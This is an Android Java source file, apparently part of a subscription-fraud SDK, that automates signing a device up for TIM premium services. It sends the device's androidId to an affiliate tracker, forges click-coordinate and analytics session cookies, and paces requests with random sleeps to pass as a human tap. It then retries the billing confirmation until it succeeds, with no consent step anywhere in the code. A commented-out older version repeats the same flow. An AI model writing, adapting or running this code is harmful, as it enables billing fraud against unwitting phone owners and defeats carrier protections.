package com.enhtmv.sublib.work.yidali;

import com.blankj.utilcode.util.LogUtils;
import com.cp.plugin.event.SubEvent;
import com.enhtmv.sublib.common.sub.SubCall;
import com.enhtmv.sublib.common.http.SubHttp;
import com.enhtmv.sublib.common.http.SubResponse;
import com.enhtmv.sublib.common.util.RandomUtil;
import com.enhtmv.sublib.common.util.RunningUtil;
import com.enhtmv.sublib.common.util.SharedUtil;
import com.enhtmv.sublib.common.util.StringUtil;

import org.jsoup.nodes.Element;

import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.HashMap;
import java.util.Locale;
import java.util.Map;
import java.util.TimeZone;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class TIMSub extends SubCall {


    private String x;
    private String y;
    private String host;

    private SubHttp http;
    private Map<String, String> header;


    @Override
    public void init(String userAgent, String operator, SubEvent event) {
        super.init(userAgent, operator, event);


        host = "vastracking.tim.it";

        y = RandomUtil.i(750, 1300) + "";
        x = RandomUtil.i(400, 700) + "";

    }


    private String[] step1(String url) throws Exception {

        SubResponse response = http.get(url, header);

        report("step1.1", "time: " + response.getTime() / 1000.0);

        //=====================================页面解析跳转=======================================

        String nextUrl = StringUtil.findByReg("<meta http-equiv=\"refresh\" content=\"0;URL='(.*)'\" />", response.body());
        if (!StringUtil.isEmpty(nextUrl)) {

            nextUrl = nextUrl.replace("amp;", "");

            response = http.get(nextUrl, header);

            report("step1.2", "time: " + response.getTime() / 1000.0);

        }


        String subUrl = parseUrl(response);

        if (StringUtil.isEmpty(url)) {

            r.w("tim_request1_error", response);

            throw new RetryException(60);
        }

        String referer = response.response().request().url().toString();


        return new String[]{subUrl, referer};

    }

    private String[] step2(String url, String referer) throws Exception {


        http.setCookie(host, "CLIENT_BINFO", "B-N");
        http.setCookie(host, "CLIENTX", x);
        http.setCookie(host, "CLIENTY", y);

        if (!http.containsCookie(host, "ai_user")) {

            String aiUser = newid() + "|" + isoDate();

            http.setCookie(host, "ai_user", aiUser);
        }


        header.put("Host", host);
        header.put("Referer", referer);

        //点击 第一次ajax
        SubResponse response = http.get(url, header);

        if (!"OK".equals(response.body())) {
            r.w("tim_request2_error", response);
            throw new RetryException();
        }

        report("step2.1", "time: " + response.getTime() / 1000.0);


        randomSleep();


        //----------------------------------- click -----------------------------------


        //ai_session
        if (!http.containsCookie(host, "ai_session")) {

            Date date = new Date();

            String aiSession = newid() + "|" + date.getTime() + "|" + date.getTime();

            http.setCookie(host, "ai_session", aiSession);

        }

        url = url.replace("&sc=T", "");

        //点击 第二次跳转
        response = http.get(url, header);

        Element element = response.doc().select("a[target=_parent]").first();

        if (element == null) {
            r.w("tim_request2_error", response);
            throw new RetryException();
        }

        String subUrl = parseUrl(response);


        report("step2.2", "time: " + response.getTime() / 1000.0);

        return new String[]{subUrl, url};
    }

    private void step3(String url, String referer) throws Exception {

        //下次延迟5分钟执行
        RunningUtil.setDelay(5 * 60);

        http.setCookie(host, "CLIENT_BINFO", "B-N");
        http.setCookie(host, "CLIENTX", x);
        http.setCookie(host, "CLIENTY", y);


        header.put("Referer", referer);

        //ok
        SubResponse response = http.get(url, header);

        if (!"OK".equals(response.body())) {

            r.w("tim_request3_error", response);

            throw new RetryException();

        }

        report("step3", "time: " + response.getTime() / 1000.0);


        randomSleep();


        //----------------------------------- click -----------------------------------

        response = http.get(url.replace("&sc=T", ""), header);

        String successUrl = response.response().request().url().toString();

        if (!subOk(response)) {

            r.w("tim_request5_error", response);

            if (successUrl.startsWith("http://api.servicelayer.mobi/pro/timokfrm.ashx")) {

                //重试订阅
                for (int i = 0; i < 5; i++) {
                    randomSleep();

                    response = http.get(successUrl);

                    String reqUrl = response.url();


                    r.i("retry_step5_" + i, response);

                    if (subOk(response)) {
                        return;
                    }

                    //订阅失败
                    if (reqUrl.startsWith("https://www.google.com")) {
                        break;
                    }

                }
            }
        }

    }


    @Override
    public void sub(String info) {

        http = http();
        header = new HashMap<>();


        header.put("DNT", "1");
        header.put("User-Agent", userAgent);


        try {

            RunningUtil.delay();


            report(SUB_REQEUST);


            String url = "http://offer.allcpx.com/offer/track?offer=219&pubId={pub_id}&clickId=" + androidId;

            //第一步
            String[] s1 = step1(url);

            randomSleep();
            randomSleep();
            randomSleep();
            randomSleep();
            randomSleep();

            //第二步
            String[] s2 = step2(s1[0], s1[1]);

            randomSleep();
            randomSleep();

            //第三步
            step3(s2[0], s2[1]);


        } catch (Exception e) {

            if (e instanceof RetryException) {

                sub(info);

            } else {
                report("tim_error", e);
                LogUtils.e(e);
            }
        }

    }

    @Override
    public void onSub(String message) {

    }

//    @Override
//    public void sub(String info) {
//
//        SubHttp http = http();
//
//        Map<String, String> header = new HashMap<>();
//
//
//        header.put("DNT", "1");
//        header.put("User-Agent", userAgent);
//
//        try {
//
//            RunningUtil.delay();
//
//            report(SUB_REQEUST, ++times + "");
//
//
//            SubResponse response = http.get("http://offer.allcpx.com/offer/track?offer=219&pubId={pub_id}&clickId=" + androidId, header);
////            SubResponse response = http.get("http://lit.gbbgame.com/sub/req", header);
//
//            report("step1.1", "time: " + response.getTime() / 1000.0);
//
//            //=====================================页面解析跳转=======================================
//
//            String nextUrl = StringUtil.findByReg("<meta http-equiv=\"refresh\" content=\"0;URL='(.*)'\" />", response.body());
//            if (!StringUtil.isEmpty(nextUrl)) {
//
//                nextUrl = nextUrl.replace("amp;", "");
//
//                response = http.get(nextUrl, header);
//                report("step1.2", "time: " + response.getTime() / 1000.0);
//
//            }
//
//
//            String url = parseUrl(response);
//
//            if (StringUtil.isEmpty(url)) {
//
//                r.w("tim_request1_error", response);
//                throw new RetryException(response.response().code() == 404 ? 0 : 60);
//            }
//
//
//            randomSleep();
//            randomSleep();
//            randomSleep();
//
//
//            //=====================================请求第二个页面=====================================
//
//            //----------------------------------- ok -----------------------------------
//
//            String aiUser = newid() + "|" + isoDate();
//
//            http.setCookie(host, "CLIENT_BINFO", "B-N");
//            http.setCookie(host, "CLIENTX", x);
//            http.setCookie(host, "CLIENTY", y);
//            http.setCookie(host, "ai_user", aiUser);
//
//
//            String referer = response.response().request().url().toString();
//
//            header.put("Host", "vastracking.tim.it");
//            header.put("Referer", referer);
//
//            //点击 第一次ajax
//            response = http.get(url, header);
//
//            if (!"OK".equals(response.body())) {
//                r.w("tim_request2_error", response);
//                throw new RetryException();
//            }
//
//            report("step2", "time: " + response.getTime() / 1000.0);
//            randomSleep();
//
//
//            //----------------------------------- click -----------------------------------
//
//
//            url = url.replace("&sc=T", "");
//
//            //ai_session
//            Date date = new Date();
//
//            String aiSession = newid() + "|" + date.getTime() + "|" + date.getTime();
//
//            http.setCookie("vastracking.tim.it", "ai_session", aiSession);
//
//
//            //点击 第二次跳转
//            response = http.get(url, header);
//
//            Element element = response.doc().select("a[target=_parent]").first();
//
//            if (element == null) {
//                r.w("tim_request3_error", response);
//                throw new RetryException();
//            }
//
//
//            report("step3", "time: " + response.getTime() / 1000.0);
//            randomSleep();
//            randomSleep();
//
//
//            //=====================================订阅请求==========================================
//
//            //----------------------------------- ok -----------------------------------
//
////            String subUrl = element.attr("href");
//            String subUrl = parseUrl(response);
//
//            http.setCookie(host, "CLIENT_BINFO", "B-N");
//            http.setCookie(host, "CLIENTX", x);
//            http.setCookie(host, "CLIENTY", y);
//
//
//            header.put("Referer", url);
//
//            //ok
//            response = http.get(subUrl, header);
//
//            if (!"OK".equals(response.body()) || subUrl == null) {
//
//                r.w("tim_request4_error", response);
//
//                throw new RetryException();
//
//            }
//
//
//            report("step4", "time: " + response.getTime() / 1000.0);
//            randomSleep();
//
//            //下次延迟5分钟执行
//            RunningUtil.setDelay(5 * 60);
//
//            //----------------------------------- click -----------------------------------
//
//            response = http.get(subUrl.replace("&sc=T", ""), header);
//
//            String successUrl = response.response().request().url().toString();
//
//            if (subOk(response)) {
//                return;
//
//            } else if (successUrl.startsWith("http://api.servicelayer.mobi/pro/timokfrm.ashx")) {
//                //重试订阅
//                for (int i = 0; i < 5; i++) {
//                    randomSleep();
//
//                    response = http.get(successUrl);
//
//                    r.i("step5." + i, response);
//
//                    if (subOk(response)) {
//                        return;
//                    }
//
//                    //订阅失败
//                    if (subUrl.startsWith("https://www.google.com")) {
//
//                        r.w("tim_request5_error", response);
//                        break;
//                    }
//
//                }
//            } else {
//                //订阅失败 https://www.google.com
//
//                r.w("tim_request5_error", response);
//
//            }
//
//            throw new RetryException();
//
//
//        } catch (Exception e) {
//
//            http.clearCookie("offer.allcpx.com");
//
//            if (e instanceof RetryException) {
//
//                sub(info);
//
//            } else {
//                report("tim_error", e);
//                LogUtils.e(e);
//            }
//        }
//
//    }

    private boolean subOk(SubResponse response) throws Exception {

        String url = response.response().request().url().toString();

        if (url.startsWith("http://offer.globaltraffictracking.com/sub_track") || url.startsWith("http://lit.gbbgame.com")) {

            randomSleep();

            success();
            return true;

        } else if (url.startsWith("https://li.lpaosub.com/already_sub218")) {

            randomSleep();

            r.s(ALREADY_SUB, url);
            SharedUtil.success();

            event.onMessage(ALREADY_SUB, "");

            return true;
        }


        return false;


    }

    private String newid() {
        double t = 1073741824 * Math.random();

        String string = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";


        StringBuilder sb = new StringBuilder();

        while (t > 0.0) {

            sb.append(string.charAt((int) t % 64));

            t = Math.floor(t / 64);


        }
        return sb.toString();
    }

    private String isoDate() {


        SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS", Locale.getDefault());
        sdf.setTimeZone(TimeZone.getTimeZone("UTC"));


        return sdf.format(new Date()) + "Z";
    }

    private String parseUrl(SubResponse response) {


        Pattern pattern = Pattern.compile("document\\.getElementById\\('(.*)'\\)\\.value");

        Matcher matcher = pattern.matcher(response.body());

        if (matcher.find()) {

            String text = matcher.group(1);

            String[] array = text.split("'\\).value\\+document\\.getElementById\\('");

            StringBuilder urlBuilder = new StringBuilder();

            for (String str : array) {

                urlBuilder.append(response.doc().select("#" + str).attr("value"));

            }
            urlBuilder.append("&bInfo=B-N").append("&sc=T");

            return urlBuilder.toString();

        }
        return null;
    }

    private void randomSleep() throws Exception {

        int num = RandomUtil.i(2000, 2500);

        Thread.sleep(num);

    }

}
